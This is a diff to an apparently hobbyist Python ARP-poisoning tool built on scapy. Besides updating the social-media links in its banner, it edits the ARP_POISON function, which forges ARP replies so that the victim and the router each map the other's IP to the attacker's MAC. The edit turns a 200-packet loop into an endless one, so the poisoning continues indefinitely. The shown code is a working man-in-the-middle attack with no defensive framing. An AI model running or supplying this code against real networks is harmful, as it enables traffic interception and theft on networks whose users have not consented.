@@ -17,8 +17,8 @@ print(r""" ||    _                                      _
                                                   _____|_\_____/||___ .01lig""")
 print("\n****************************************************\n")
 print("********Copyright of gilles karougbe, jully 2022********")
-print("*********http://www.github.com/gilleskarougbe***********")
-print("***********https://twiter.com/01karougbe****************")
+print("*********https://www.github.com/gil01karougbe***********")
+print("***********https://twitter.com/01karougbe****************")
 print("***linkedin.com/in/essognim-gilles-karougbe-015979223***")
 print("\n****************************************************\n")
 
@@ -57,12 +57,13 @@ def ARP_POISON(my_mac,Victim_mac,Victim_ip,Router_mac,Router_ip):
     #ARP fields
     Victim_arp = scapy.ARP(op = 2,hwsrc = my_mac,psrc = Router_ip,hwdst = Victim_mac,pdst = Victim_ip)
     Router_arp = scapy.ARP(op = 2,hwsrc = my_mac,psrc = Victim_ip ,hwdst = Router_mac,pdst = Router_ip )
+    
     #stacking ether and arp
     Victim_pkt = Victim_ether/Victim_arp
     Router_pkt = Router_ether/Router_arp
 
     #sendings arp responses to the network
-    for i in range(200):
+    while True:
         scapy.sendp(Victim_pkt,verbose = 0)
         scapy.sendp(Router_pkt,verbose = 0)
         sleep(2)
